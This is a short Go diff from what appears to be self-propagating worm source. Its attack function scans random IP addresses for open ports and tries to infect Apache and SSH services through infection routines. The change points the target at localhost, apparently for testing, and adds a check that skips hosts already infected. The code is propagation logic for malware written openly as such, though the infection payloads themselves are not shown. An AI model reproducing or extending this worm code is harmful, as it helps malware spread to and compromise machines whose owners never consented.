@@ -16,14 +16,16 @@ func attack(wg *sync.WaitGroup, id int, baseIp [4]int) {
 	var ports [3]int
 	for i := 0; i < it; i++ {
 		ip = scan.GetRandomIp(baseIp)
+		ip = "localhost"
 		fmt.Println(attackerString + ip)
-		//ip = "localhost"
 		ports = scan.ScanIp(ip)
 		infected := false
 		//Apache infect
 		if ports[0] != 0 {
-			infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
-			infected = true
+			if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
+				infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
+				fmt.Println(infected)
+			}
 		}
 		//SSH infect
 		if !infected && ports[1] != 0 {
